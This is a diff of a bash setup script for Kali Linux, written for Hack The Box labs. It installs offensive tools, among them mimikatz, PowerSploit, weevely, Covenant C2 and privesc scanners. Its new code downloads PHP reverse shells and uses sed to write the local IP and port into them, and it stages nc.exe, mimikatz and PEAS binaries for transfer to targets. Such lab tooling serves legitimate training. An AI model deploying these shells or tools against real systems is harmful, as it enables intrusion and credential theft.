@@ -2,7 +2,7 @@
 ## =======================================================================================
 # File:     bootstrap-htb.sh
 # Author:   Cashiuus
-# Created:  08-Apr-2020     Revised: 20-Mar-2022
+# Created:  08-Apr-2020     Revised: 28-Apr-2022
 #
 ##-[ Info ]-------------------------------------------------------------------------------
 # Purpose:  Run this script on new Kali images to automatically configure and
@@ -17,6 +17,7 @@
 # Credits:  + g0tmi1k for teaching me bash scripting through his kali OS scripts
 #
 ##-[ Changelog ]-----------------------------------------------------------------------
+#   2022-04-28: Added win php shell, enhanced updater capability, now grabs IP to put into saved shells
 #   2022-03-20: Re-organized transfer-stage so that pivoting, shells, & privesc tools are all in here (we transfer all of them)
 #   2022-01-24: Minor bugfixes; Added firepwd go the git clone list
 #   2020-12-27: Removed python 2 from setup completely, as python 3 is the default now
@@ -27,7 +28,7 @@
 ##-[ Copyright ]--------------------------------------------------------------------------
 #   MIT License ~ http://opensource.org/licenses/MIT
 ## =======================================================================================
-__version__="3.2.3"
+__version__="3.2.4"
 __author__="Cashiuus"
 ## ==========[ TEXT COLORS ]============= ##
 GREEN="\033[01;32m"     # Success
@@ -55,6 +56,7 @@ HTB_PIVOTING="${HTB_TRANSFERS}/pivoting"      # Resources for pivoting/c2
 HTB_PRIVESC="${HTB_TRANSFERS}/privesc"        # Privesc tools for both Linux and Windows
 HTB_SHELLS="${HTB_TRANSFERS}/shells"            # Various shells we can use (or created along the way)
 BURPSUITE_CONFIG_DIR="${HOME}/burpsuite"        # Burpsuite configs, libs, extensions, etc in one place
+PORT='9000'                                     # Port you want inserted into saved reverse shells
 
 # Arrays listing all of the dirs we will create
 CREATE_USER_DIRECTORIES=(burpsuite git go toolkit vpn)              # Subdirs of $HOME/
@@ -187,6 +189,42 @@ function check_root() {
 check_root
 
 
+# --- Get Current IP to put into shell files ----
+IP=$(hostname -I | awk '{print $2}')
+if [[ -z $IP ]]; then
+  # You aren't connected to VPN and it failed to grab a secondary IP, so fallback to first one?
+  IP=$(hostname -I | awk '{print $1}')
+fi
+
+
+
+function install_or_update_git() {
+  # Purpose: Attempt git clone to current directory, if fails, cd into it and do git pull
+  #
+  #   Usage:  install_or_update_git <dir_name> <github_url>
+  #         $1 dir_name
+  #         $2 github_url
+  if [[ $# -lt 2 ]]; then
+    echo -e "${RED}[ERR]${RESET} Not enough args to install or update the provided git repo"
+    return 1
+  fi
+  git clone "$2" "$1" 2>/dev/null
+  if [[ $? -ne 0 ]]; then
+    # git clone failed, so try to cd in and update it
+    echo -e "${YELLOW}[WRN]${RESET} ${2} is already installed. Updating it instead..."
+    cd "${1}"
+    if [[ $? -eq 0 ]]; then
+      git pull >/dev/null
+      cd ..
+      return 0
+    fi
+  else
+    return 0
+  fi
+  return 1
+}
+
+
 # ===========================[ Begin Installs ]============================== #
 # Fix display output for GUI programs (when connecting via SSH)
 export DISPLAY=:0.0
@@ -204,21 +242,32 @@ if [[ ! -f /sys/hypervisor/type ]] &&  [[ ! $(which vmware-toolbox-cmd) ]]; then
   $SUDO reboot
 fi
 
-# Increase Bash history settings
-file="${HOME}/.bashrc"
-sed -i 's/^HISTSIZE=.*/HISTSIZE=90000/' "${file}"
-sed -i 's/^HISTFILESIZE=.*/HISTFILESIZE=9999/' "${file}"
-
-if [[ ${GDMSESSION} == 'lightdm-xsession' ]]; then
-  # Increasing terminal history scrolling limit
-  file="${HOME}/.config/qterminal.org/qterminal.ini"
-  [[ -s "${file}" ]] && sed -i 's/^HistoryLimitedTo=.*/HistoryLimitedTo=30000/' "${file}"
+# ==========[ Updater ]=============
+if [[ "$update" = true ]]; then
+  # Only do update stuff
+  echo ''
 fi
 
-# =============================[ APT Packages ]================================ #
-if [[ "$update" != true ]]; then
+
+function configure_terminal_settings() {
+  # Increase Bash history settings
+  file="${HOME}/.bashrc"
+  sed -i 's/^HISTSIZE=.*/HISTSIZE=90000/' "${file}"
+  sed -i 's/^HISTFILESIZE=.*/HISTFILESIZE=9999/' "${file}"
+
+  if [[ ${GDMSESSION} == 'lightdm-xsession' ]]; then
+    # Increasing terminal history scrolling limit
+    file="${HOME}/.config/qterminal.org/qterminal.ini"
+    [[ -s "${file}" ]] && sed -i 's/^HistoryLimitedTo=.*/HistoryLimitedTo=30000/' "${file}"
+  fi
+}
+[[ "$update" != true ]] && configure_terminal_settings
+
+
+# =============[ APT Packages ]============= #
+function reset_apt_sources() {
   # Change the apt/sources.list repository listings to just a single entry:
-  echo -e "\n${GREEN}[ * ] ${RESET}Resetting Aptitude sources.list to the 2 preferred kali entries"
+  echo -e "\n${GREEN}[*] ${RESET}Resetting Aptitude sources.list to the 2 preferred kali entries"
   file=/etc/apt/sources.list
   [[ -e "${file}" ]] && $SUDO cp -n $file{,.bkup}
   if [[ $SUDO ]]; then
@@ -230,51 +279,56 @@ if [[ "$update" != true ]]; then
     echo "deb http://http.kali.org/kali kali-rolling main contrib non-free" >> /etc/apt/sources.list
     echo "deb-src http://http.kali.org/kali kali-rolling main contrib non-free" >> /etc/apt/sources.list
   fi
-fi
-
-echo -e "\n${GREEN}[ * ] ${RESET}Issuing apt-get update and dist-upgrade, please wait..."
-export DEBIAN_FRONTEND=noninteractive
-$SUDO apt-get -qq update
-$SUDO apt-get -y -q -o Dpkg::Options::="--force-confdef" \
-  -o Dpkg::Options::="--force-confold" dist-upgrade
-
-echo -e "\n${GREEN}[ * ] ${BLUE}apt-get ::${RESET} Installing core utilities"
-$SUDO apt-get -y -qq install bash-completion build-essential curl dos2unix locate \
-  gcc geany git gnumeric golang gzip jq libssl-dev make net-tools openssl openvpn \
-  powershell pv tmux wget unzip xclip
-
-$SUDO apt-get -y -qq install geany htop strace sysv-rc-conf tree
-
-echo -e "\n${GREEN}[ * ] ${BLUE}apt-get ::${RESET} Installing common HTB tools"
-$SUDO apt-get -y -qq install bloodhound brutespray dirb dirbuster docx2txt exploitdb \
-  fcrackzip feroxbuster flameshot gdb gobuster ipmitool libimage-exiftool-perl neo4j \
-  nikto proxychains4 rdesktop redsocks responder seclists shellter sqlmap \
-  sshuttle windows-binaries
-
-# Python 3
-$SUDO apt-get -y -qq install python3 python3-dev python3-pip python3-setuptools python3-venv || \
-  echo -e "${YELLOW}[ERR] Errors occurred installing Python 3.x, you may have issues${RESET}" \
-  && sleep 2
-$SUDO apt-get -y install python-is-python3
+}
+[[ "$update" != true ]] && reset_apt_sources
 
 
-#if [ -z "$(command -v python 2>&1)" ]; then
-  #echo -e "[ERROR] python does not appear to be installed, something is wrong"
-  #exit 1
-#fi
+function update_os_apt() {
+  echo -e "\n${GREEN}[*] ${RESET}Issuing apt-get update and dist-upgrade, please wait..."
+  export DEBIAN_FRONTEND=noninteractive
+  $SUDO apt-get -qq update
+  $SUDO apt-get -y -q -o Dpkg::Options::="--force-confdef" \
+    -o Dpkg::Options::="--force-confold" dist-upgrade
+}
+update_os_apt
 
 
-# Pillow depends
-$SUDO apt-get -y -qq install libtiff5-dev libjpeg62-turbo-dev libfreetype6-dev \
-    liblcms2-dev libwebp-dev libffi-dev zlib1g-dev
-# lxml depends
-$SUDO apt-get -y -qq install libxml2-dev libxslt1-dev zlib1g-dev
-# Postgresql and psycopg2 depends
-$SUDO apt-get -y -qq install libpq-dev
+function install_core_hacker_bundle() {
+  echo -e "\n${GREEN}[*] ${BLUE}apt-get ::${RESET} Installing core utilities"
+  $SUDO apt-get -y -qq install bash-completion build-essential curl dos2unix locate \
+    gcc geany git gnumeric golang gzip jq libssl-dev make net-tools openssl openvpn \
+    powershell pv tmux wget unzip xclip
 
-# Install baseline set of system-wide pip packages
-file="/tmp/requirements.txt"
-cat <<EOF > "${file}"
+  $SUDO apt-get -y -qq install geany htop strace sysv-rc-conf tree
+
+  echo -e "\n${GREEN}[*] ${BLUE}apt-get ::${RESET} Installing common HTB tools"
+  $SUDO apt-get -y -qq install bloodhound brutespray dirb dirbuster docx2txt exploitdb \
+    fcrackzip feroxbuster flameshot gdb gobuster ipmitool libimage-exiftool-perl neo4j \
+    nikto proxychains4 rdesktop redsocks responder seclists shellter sqlmap \
+    sshuttle windows-binaries
+}
+# Ensure these are installed no matter what
+install_core_hacker_bundle
+
+
+function install_python3() {
+  # Python 3
+  $SUDO apt-get -y -qq install python3 python3-dev python3-pip python3-setuptools python3-venv || \
+    echo -e "${YELLOW}[ERR] Errors occurred installing Python 3.x, you may have issues${RESET}" \
+    && sleep 2
+  $SUDO apt-get -y install python-is-python3
+
+  # Pillow depends
+  $SUDO apt-get -y -qq install libtiff5-dev libjpeg62-turbo-dev libfreetype6-dev \
+      liblcms2-dev libwebp-dev libffi-dev zlib1g-dev
+  # lxml depends
+  $SUDO apt-get -y -qq install libxml2-dev libxslt1-dev zlib1g-dev
+  # Postgresql and psycopg2 depends
+  $SUDO apt-get -y -qq install libpq-dev
+
+  # Install baseline set of system-wide pip packages
+  file="/tmp/requirements.txt"
+  cat <<EOF > "${file}"
 argparse
 beautifulsoup4
 bloodhound
@@ -296,19 +350,20 @@ requests
 six
 wheel
 EOF
-python3 -m pip install -q -r /tmp/requirements.txt || \
-  $SUDO python3 -m pip install -q -r /tmp/requirements.txt
-
+  python3 -m pip install -q -r /tmp/requirements.txt || \
+    $SUDO python3 -m pip install -q -r /tmp/requirements.txt
+}
+[[ "$update" != true ]] && install_python3
 
 
 # -- Flameshot screenshotting, make it the default so global hotkeys work
-function keybindings_flameshot() {
+function configure_keybindings_flameshot() {
   # Ensure that we make Flameshot the default app for global hotkeys "PrntScr" and "Ctrl+PrntScr"
   xfconf-query -n -c xfce4-keyboard-shortcuts -p '/commands/custom/Print' -t string -s "/usr/bin/flameshot gui"
   xfconf-query -n -c xfce4-keyboard-shortcuts -p '/commands/custom/<Primary>Print' -t string -s "/usr/bin/flameshot gui"
   xfconf-query -n -c xfce4-keyboard-shortcuts -p '/commands/custom/<Super>Print' -t string -s "/usr/bin/flameshot gui"
 }
-
+[[ "$update" != true ]] && configure_keybindings_flameshot
 
 
 # -- Create Directory Structure -------------------------------------------------
@@ -353,21 +408,25 @@ if [[ "$update" != true ]]; then
 fi
 
 # -- Dirs: HTB Toolkit -----------------------
-#mkdir -p ~/htb/{boxes,credentials,shells,privesc,wordlists}
-# Create core subdirs in our HTB_TOOLKIT_DIR
-echo -e "${GREEN}[*]${RESET} Creating ${GREEN}HTB toolkit${RESET} core subdirectories"
-for dir in ${CREATE_TOOLKIT_DIRS[@]}; do
-    mkdir -p "${HTB_TOOLKIT_DIR}/${dir}"
-done
-mkdir -p "${HTB_NOTES}/templates"
+if [[ "$update" != true ]]; then
+  #mkdir -p ~/htb/{boxes,credentials,shells,privesc,wordlists}
+  # Create core subdirs in our HTB_TOOLKIT_DIR
+  echo -e "${GREEN}[*]${RESET} Creating ${GREEN}HTB toolkit${RESET} core subdirectories"
+  for dir in ${CREATE_TOOLKIT_DIRS[@]}; do
+      mkdir -p "${HTB_TOOLKIT_DIR}/${dir}"
+  done
+  mkdir -p "${HTB_NOTES}/templates"
+fi
 
 # -- Dirs: HTB Boxes -----------------------
-#mkdir -p ~/htb/{boxes,credentials,shells,privesc,wordlists}
-# Create core subdirs in our HTB BASE DIR
-echo -e "${GREEN}[*]${RESET} Creating ${GREEN}HTB project${RESET} core subdirectories"
-for dir in ${CREATE_HTB_DIRS[@]}; do
-    mkdir -p "${HTB_BASE_DIR}/${dir}"
-done
+if [[ "$update" != true ]]; then
+  #mkdir -p ~/htb/{boxes,credentials,shells,privesc,wordlists}
+  # Create core subdirs in our HTB BASE DIR
+  echo -e "${GREEN}[*]${RESET} Creating ${GREEN}HTB project${RESET} core subdirectories"
+  for dir in ${CREATE_HTB_DIRS[@]}; do
+      mkdir -p "${HTB_BASE_DIR}/${dir}"
+  done
+fi
 
 # -- Penprep repository -----------------------
 if [[ ! -d "${HOME}/git/penprep" ]]; then
@@ -377,30 +436,37 @@ else
 fi
 
 # -- Dotfiles -----------------------
-if [[ -d "${HOME}/git/penprep" ]]; then
-  echo -e -n "\n${GREEN}[+]${RESET}"
-  read -e -t 8 -i "Y" -p " Perform simple install of dotfiles? [Y,n]: " response
-  echo -e
+if [[ "$update" != true ]]; then
+  if [[ -d "${HOME}/git/penprep" ]]; then
+    echo -e -n "\n${GREEN}[+]${RESET}"
+    read -e -t 8 -i "Y" -p " Perform simple install of dotfiles? [Y,n]: " response
+    echo -e
 
-  case $response in
-    [Yy]* ) DO_DOTFILES=true;;
-  esac
-else
-  echo -e "{GREEN}[*] ${BLUE}penprep${RESET} repo not found, skipping dotfiles install"
-  sleep 2s
+    case $response in
+      [Yy]* ) DO_DOTFILES=true;;
+    esac
+  else
+    echo -e "{GREEN}[*] ${BLUE}penprep${RESET} repo not found, skipping dotfiles install"
+    sleep 2s
+  fi
+
+  [[ $DO_DOTFILES ]] && "${HOME}/git/penprep/dotfiles/install-simple.sh"
 fi
-
-[[ $DO_DOTFILES ]] && "${HOME}/git/penprep/dotfiles/install-simple.sh"
 
 
 # -- Various Extra Tools -------------------------------------------------------
-### Evil-WinRM install
-echo -e "\n${GREEN}[*] ${RESET}Installing Evil-WinRM"
-$SUDO apt-get -y -qq install rubygems
-$SUDO gem install evil-winrm
+function install_evilwinrm() {
+  ### Evil-WinRM install
+  echo -e "\n${GREEN}[*] ${RESET}Installing Evil-WinRM"
+  $SUDO apt-get -y -qq install rubygems
+  $SUDO gem install evil-winrm
+}
+[[ "$update" != true ]] && install_evilwinrm
+
 
 # Get common shells to use
 echo -e "\n${GREEN}[*] ${RESET}Grabbing useful ${BOLD}shells/backdoors${RESET}"
+[[ ! -d "${HTB_SHELLS}" ]] && mkdir -p "${HTB_SHELLS}"
 cd "${HTB_SHELLS}"
 git clone https://github.com/borjmz/aspx-reverse-shell
 git clone https://github.com/eb3095/php-shell
@@ -408,60 +474,114 @@ git clone https://github.com/infodox/python-pty-shells
 git clone https://github.com/0dayCTF/reverse-shell-generator
 git clone https://github.com/epinna/weevely3
 
+# Ivan's version works on Windows targets, like a PHP webserver running on XAMPP
+curl -SL 'https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php' -o 'ivan-reverse-shell.php' || echo -e "[ERROR] Failed to download Ivan's reverse-shell.php file"
+file="${HTB_SHELLS}/ivan-reverse-shell.php"
+# -- Build the code line and then 'sed' it into the file
+#string="\$sh = new Shell("+"'"+"${IP}"+"'"+", $PORT);"
+string="\$sh = new Shell("
+string+="'"
+string+="${IP}"
+string+="'"
+string+=", $PORT);"
+#echo -e "[*] string: $string"
+sed -i "s/^\$sh = new Shell.*/${string}/" "${file}"
 
-if [[ ! -d "${HTB_SHELLS}/pentestmonkey" ]]; then
-  mkdir pentestmonkey && cd pentestmonkey
-  curl -SL 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php' -o 'php-reverse-shell.php' || echo -e "[ERROR] Failed to download php-reverse-shell.php file"
-fi
+
+[[ ! -d "${HTB_SHELLS}" ]] && mkdir -p "${HTB_SHELLS}"
+cd "${HTB_SHELLS}"
+curl -SL 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php' -o 'monkey-reverse-shell.php' || echo -e "[ERROR] Failed to download Pentest Monkey's php-reverse-shell.php file"
+file="${HTB_SHELLS}/monkey-reverse-shell.php"
+# Build strings and sed into the file
+string="\$ip = "
+string+="'"
+string+="$IP"
+string+="'"
+string+=";"
+sed -i "s/^\$ip =.*/${string}/" "${file}"
+string="\$port = $PORT;"
+sed -i "s/^\$port =.*/${string}/" "${file}"
+
 
 echo -e "\n${GREEN}[*] ${RESET}Grabbing useful ${BOLD}Privilege Escalation${RESET} scanners"
+[[ ! -d "${HTB_PRIVESC}" ]] && mkdir -p "${HTB_PRIVESC}"
 cd "${HTB_PRIVESC}"
-git clone https://github.com/AlessandroZ/BeRoot
-git clone https://github.com/gentilkiwi/mimikatz
-git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite peass
-git clone https://github.com/enjoiz/Privesc Privesc-PS
-git clone https://github.com/n1nj4sec/pupy
-git clone https://github.com/skelsec/pypykatz
-git clone https://github.com/rasta-mouse/Sherlock
-git clone https://github.com/etc5had0w/suider
-git clone https://github.com/rasta-mouse/Watson
-git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester
-git clone https://github.com/pentestmonkey/windows-privesc-check
+#git clone https://github.com/AlessandroZ/BeRoot
+#git clone https://github.com/gentilkiwi/mimikatz
+##git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite peass
+#git clone https://github.com/enjoiz/Privesc Privesc-PS
+#git clone https://github.com/n1nj4sec/pupy
+#git clone https://github.com/skelsec/pypykatz
+#git clone https://github.com/rasta-mouse/Sherlock
+#git clone https://github.com/etc5had0w/suider
+#git clone https://github.com/rasta-mouse/Watson
+#git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+#git clone https://github.com/pentestmonkey/windows-privesc-check
+
+
+declare -A gittools_privesc
+gittools_privesc["BeRoot"]="https://github.com/AlessandroZ/BeRoot"
+gittools_privesc["mimikatz"]="https://github.com/gentilkiwi/mimikatz"
+gittools_privesc["peass-ng"]="https://github.com/carlospolop/PEASS-ng"
+gittools_privesc["Privesc-PS"]="https://github.com/enjoiz/Privesc"
+gittools_privesc["pupy"]="https://github.com/n1nj4sec/pupy"
+gittools_privesc["pypykatz"]="https://github.com/skelsec/pypykatz"
+gittools_privesc["Sherlock"]="https://github.com/rasta-mouse/Sherlock"
+gittools_privesc["suider"]="https://github.com/etc5had0w/suider"
+gittools_privesc["Watson"]="https://github.com/rasta-mouse/Watson"
+gittools_privesc["Windows-Exploit-Suggester"]="https://github.com/AonCyberLabs/Windows-Exploit-Suggester"
+gittools_privesc["windows-privesc-check"]="https://github.com/pentestmonkey/windows-privesc-check"
+
+
+step=0
+for t in "${!gittools_privesc[@]}"; do
+  step=$((step + 1))
+  cd "${HTB_PRIVESC}"
+  install_or_update_git "$t" "${gittools_privesc[$t]}"
+  if [[ $? -ne 0 ]]; then
+    echo -e "${RED}[ERR]${RESET} (${step}/${#gittools_privesc[@]}) $t Failed to install/update, try it again later."
+  else
+    echo -e "${GREEN}[*]${RESET} (${step}/${#gittools_privesc[@]}) $t installed/updated successfully\n"
+  fi
+done
 
 
 
-# -- Covenant C2 Framework (requires dotnet) -------
-echo -e "\n${GREEN}[*] ${RESET}Installing the Covenant C2 Framework for advanced labs"
-$SUDO apt-get -y install libc6 libgcc1 libgssapi-krb5-2
-$SUDO apt-get -y install libicu67 || $SUDO apt-get -y install libicu63
-$SUDO apt-get -y install libssl1.1 libstdc++6 zlib1g
-# Install .NET Guide: https://docs.microsoft.com/en-us/dotnet/core/install/linux-debian#debian-10-
-cd /tmp
-wget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb \
-  -O packages-microsoft-prod.deb
-$SUDO dpkg -i packages-microsoft-prod.deb
-$SUDO apt-get -qq update
-$SUDO apt-get -y install apt-transport-https
-$SUDO apt-get -qq update
-$SUDO apt-get install -y dotnet-sdk-5.0
 
-# Can disable auto collection of telemetry data to microsoft; put this in service file?
-export DOTNET_CLI_TELEMETRY_OPTOUT=1
 
-# Installing dev branch which is currently build on .NET SDK 5.0 (stable is on v3.1)
-cd /opt
-$SUDO git clone --recurse-submodules https://github.com/cobbr/Covenant -b dev
-if [[ $(which dotnet) ]]; then
-  cd Covenant/Covenant
-  $SUDO dotnet build
-  $SUDO dotnet publish -c Release
-  #$SUDO dotnet run
-  # First-run you will need to go to https://localhost:7443/ and create new user
+function install_covenant() {
+  # -- Covenant C2 Framework (requires dotnet) -------
+  echo -e "\n${GREEN}[*] ${RESET}Installing the Covenant C2 Framework for advanced labs"
+  $SUDO apt-get -y install libc6 libgcc1 libgssapi-krb5-2
+  $SUDO apt-get -y install libicu67 || $SUDO apt-get -y install libicu63
+  $SUDO apt-get -y install libssl1.1 libstdc++6 zlib1g
+  # Install .NET Guide: https://docs.microsoft.com/en-us/dotnet/core/install/linux-debian#debian-10-
+  cd /tmp
+  wget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb \
+    -O packages-microsoft-prod.deb
+  $SUDO dpkg -i packages-microsoft-prod.deb
+  $SUDO apt-get -qq update
+  $SUDO apt-get -y install apt-transport-https
+  $SUDO apt-get -qq update
+  $SUDO apt-get install -y dotnet-sdk-5.0
 
-  # Setup a service for this: https://swimburger.net/blog/dotnet/how-to-run-a-dotnet-core-console-app-as-a-service-using-systemd-on-linux
-  #file_original="/opt/Covenant/Covenant/covenant.service"
-  file="/tmp/covenant.service"
-  cat <<EOF > "${file}"
+  # Can disable auto collection of telemetry data to microsoft; put this in service file?
+  export DOTNET_CLI_TELEMETRY_OPTOUT=1
+
+  # Installing dev branch which is currently build on .NET SDK 5.0 (stable is on v3.1)
+  cd /opt
+  $SUDO git clone --recurse-submodules https://github.com/cobbr/Covenant -b dev
+  if [[ $(which dotnet) ]]; then
+    cd Covenant/Covenant
+    $SUDO dotnet build
+    $SUDO dotnet publish -c Release
+    #$SUDO dotnet run
+    # First-run you will need to go to https://localhost:7443/ and create new user
+
+    # Setup a service for this: https://swimburger.net/blog/dotnet/how-to-run-a-dotnet-core-console-app-as-a-service-using-systemd-on-linux
+    #file_original="/opt/Covenant/Covenant/covenant.service"
+    file="/tmp/covenant.service"
+    cat <<EOF > "${file}"
 [Unit]
 Description=Covenant Service
 After=network.target
@@ -478,39 +598,82 @@ Environment=DOTNET_CLI_TELEMETRY_OPTOUT=1
 [Install]
 WantedBy=default.target
 EOF
-  # After copy, file should have permissions 0644 set automatically, but might want to verify
-  $SUDO cp -u "${file}" /etc/systemd/system/covenant.service
-  #$SUDO systemctl demon-reload
-  #$SUDO systemctl start covenant
-  #$SUDO systemctl enable covenant
+    # After copy, file should have permissions 0644 set automatically, but might want to verify
+    $SUDO cp -u "${file}" /etc/systemd/system/covenant.service
+    #$SUDO systemctl demon-reload
+    #$SUDO systemctl start covenant
+    #$SUDO systemctl enable covenant
+  else
+    echo -e "${RED}[ERROR] dotnet command not found, install must have failed.${RESET}"
+    echo -e "${RED}\tGo here and fix:${RESET}  https://docs.microsoft.com/en-us/dotnet/core/install/linux-debian#debian-10-"
+    echo -e "${RED}\t Once fixed, in /opt/Covenant/Covenant dir, run:${RESET} dotnet build && dotnet run"
+  fi
+}
+[[ "$update" != true ]] && install_covenant
 
-else
-  echo -e "${RED}[ERROR] dotnet command not found, install must have failed.${RESET}"
-  echo -e "${RED}\tGo here and fix:${RESET}  https://docs.microsoft.com/en-us/dotnet/core/install/linux-debian#debian-10-"
-  echo -e "${RED}\t Once fixed, in /opt/Covenant/Covenant dir, run:${RESET} dotnet build && dotnet run"
-fi
 
 
-echo -e "\n${GREEN}[*] ${RESET}Loading a bunch of additional tools into \${HOME}/git/"
+echo -e "\n${GREEN}[*] ${RESET}Loading a bunch of additional tools into ${HOME}/git/"
+[[ ! -d "${HOME}/git" ]] && mkdir -p "${HOME}/git"
 cd "${HOME}/git"
-git clone https://github.com/samratashok/ADModule
-git clone https://github.com/BloodHoundAD/BloodHound
-git clone https://github.com/leebaird/discover
-git clone https://github.com/elceef/dnstwist
-git clone https://github.com/TheWover/donut
-git clone https://github.com/samratashok/nishang
-git clone https://github.com/21y4d/nmapAutomator
-git clone https://github.com/PowerShellMafia/PowerSploit
-git clone https://github.com/NetSPI/PowerUpSQL
-git clone https://github.com/GhostPack/Seatbelt
-git clone https://github.com/byt3bl33d3r/SprayingToolkit
-git clone https://github.com/abatchy17/WindowsExploits
-git clone https://github.com/lclevy/firepwd         # Firefox password extractor
-git clone https://github.com/epinna/tplmap          # Template scanner for SSTI vulns
+declare -A gittools
+gittools["ADModule"]="https://github.com/samratashok/ADModule"
+gittools["Bloodhound"]="https://github.com/BloodHoundAD/BloodHound"
+gittools["discover"]="https://github.com/leebaird/discover"
+gittools["dnstwist"]="https://github.com/elceef/dnstwist"
+gittools["donut"]="https://github.com/TheWover/donut"
+gittools["nishang"]="https://github.com/samratashok/nishang"
+gittools["nmapAutomator"]="https://github.com/21y4d/nmapAutomator"
+gittools["PowerSploit"]="https://github.com/PowerShellMafia/PowerSploit"
+gittools["PowerUpSQL"]="https://github.com/NetSPI/PowerUpSQL"
+gittools["Seatbelt"]="https://github.com/GhostPack/Seatbelt"
+gittools["SprayingToolkit"]="https://github.com/byt3bl33d3r/SprayingToolkit"
+gittools["WindowsExploits"]="https://github.com/abatchy17/WindowsExploits"
+gittools["firepwd"]="https://github.com/lclevy/firepwd"
+gittools["tplmap"]="https://github.com/epinna/tplmap"
+gittools["SharpGen"]="https://github.com/cobbr/SharpGen"
+gittools["cupp"]="https://github.com/Mebus/cupp"
+gittools["mentalist"]="https://github.com/sc0tfree/mentalist"
 
-git clone https://github.com/cobbr/SharpGen       # setup requires cmd: `dotnet build`
+#git clone https://github.com/samratashok/ADModule
+#git clone https://github.com/BloodHoundAD/BloodHound
+#git clone https://github.com/leebaird/discover
+#git clone https://github.com/elceef/dnstwist
+#git clone https://github.com/TheWover/donut
+#git clone https://github.com/samratashok/nishang
+#git clone https://github.com/21y4d/nmapAutomator
+#git clone https://github.com/PowerShellMafia/PowerSploit
+#git clone https://github.com/NetSPI/PowerUpSQL
+#git clone https://github.com/GhostPack/Seatbelt
+#git clone https://github.com/byt3bl33d3r/SprayingToolkit
+#git clone https://github.com/abatchy17/WindowsExploits
+#git clone https://github.com/lclevy/firepwd         # Firefox password extractor
+#git clone https://github.com/epinna/tplmap          # Template scanner for SSTI vulns
+
+#git clone https://github.com/cobbr/SharpGen       # setup requires cmd: `dotnet build`
+
+# Password list customization/generation toolkits
+#git clone https://github.com/Mebus/cupp
+#git clone https://github.com/sc0tfree/mentalist
+
+# New install method
+step=0
+for t in "${!gittools[@]}"; do
+  step=$((step + 1))
+  cd "${HOME}/git"
+  install_or_update_git "$t" "${gittools[$t]}"
+  if [[ $? -ne 0 ]]; then
+    echo -e "${RED}[ERR]${RESET} (${step}/${#gittools[@]}) $t Failed to install/update, try it again later."
+  else
+    echo -e "${GREEN}[*]${RESET} (${step}/${#gittools[@]}) $t installed/updated successfully\n"
+  fi
+done
+
+
+
+#[[ "$update" != true]] && cd SharpGen && dotnet build
+cd "${HOME}/git"
 cd SharpGen && dotnet build
-
 
 
 [[ $(pip3 show autorecon 2>/dev/null) ]] || $SUDO python3 -m pip install git+https://github.com/Tib3rius/AutoRecon.git
@@ -560,14 +723,11 @@ fi
 
 # -- Singular web directory for file transfers ----------------------------------
 echo -e "\n${GREEN}[*]${RESET} Consolidating all our goodies in one place for ${BOLD}remote file transfers${RESET} (nc, mimi, scanners, etc)"
-
+[[ ! -d "${HTB_TRANSFERS}" ]] && mkdir -p "${HTB_TRANSFERS}"
 cd "${HTB_TRANSFERS}"
 cp -n "/usr/share/windows-binaries/nc.exe" ./
 cp -n "/usr/share/windows-binaries/wget.exe" ./
 cp -n "/usr/share/windows-resources/mimikatz/x64/mimikatz.exe" ./
-cp -n "${HTB_PRIVESC}/peass/linPEAS/linpeas.sh" ./
-cp -n "${HTB_PRIVESC}/peass/winPEAS/winPEASexe/binaries/x86/Release/winPEASx86.exe" ./
-cp -n "${HTB_PRIVESC}/peass/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe" ./
 cp -n "${HTB_PRIVESC}/Windows-Exploit-Suggester/windows-exploit-suggester.py" ./
 cp -n "${HTB_PRIVESC}/Sherlock/Sherlock.ps1" ./
 cp -n "${HOME}/git/PowerSploit/Privesc/PowerUp.ps1" ./
@@ -578,23 +738,31 @@ cp -n "${HOME}/git/PowerSploit/AntivirusBypass/Find-AVSignature.ps1" ./
 cp -n "${HOME}/git/ADModule/Import-ActiveDirectory.ps1" ./
 cp -n "${HOME}/git/ADModule/Microsoft.ActiveDirectory.Management.dll" ./
 
+# --- linpeas/winpeas newest version method
+curl -SL 'https://github.com/carlospolop/PEASS-ng/releases/download/20220424/linpeas.sh' -o 'linpeas.sh'
+curl -SL 'https://github.com/carlospolop/PEASS-ng/releases/download/20220424/winPEAS.bat' -o 'winpeas.bat'
+curl -SL 'https://github.com/carlospolop/PEASS-ng/releases/download/20220424/winPEASany.exe' -o 'winpeas.exe'
+
+
+
 # pspy the binaries are in 'releases' not in the cloned project
-if [[ ! -f "${HTB_TRANSFERS}/pspy64s" ]]; then
-  echo -e "\n${GREEN}[*] ${RESET}Downloading ${BOLD}Pspy${RESET} binaries"
-  curl -SL 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s' -o pspy64s
-  curl -SL 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32s' -o pspy32s
-  chmod +x pspy64s
-  chmod +x pspy32s
-fi
-if [[ ! -f "${HTB_TRANSFERS}/chisel.exe" ]]; then
-  echo -e "\n${GREEN}[*] ${RESET}Downloading ${BOLD}Chisel${RESET}"
-  curl -SL 'https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz' -o chisel.gz
-  gunzip chisel.gz
-  mv chisel chisel.exe
-  curl -SL 'https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz' -o chisel.gz
-  gunzip chisel.gz
-  chmod +x chisel
-fi
+# v1.2 is still the most current, checked site last on April 28, 2022
+echo -e "\n${GREEN}[*] ${RESET}Downloading ${BOLD}Pspy${RESET} binaries"
+curl -SL 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s' -o pspy64s
+curl -SL 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32s' -o pspy32s
+chmod +x pspy64s
+chmod +x pspy32s
+
+# --- Chisel - latest is v1.7.7
+echo -e "\n${GREEN}[*] ${RESET}Downloading latest ${BOLD}Chisel${RESET}"
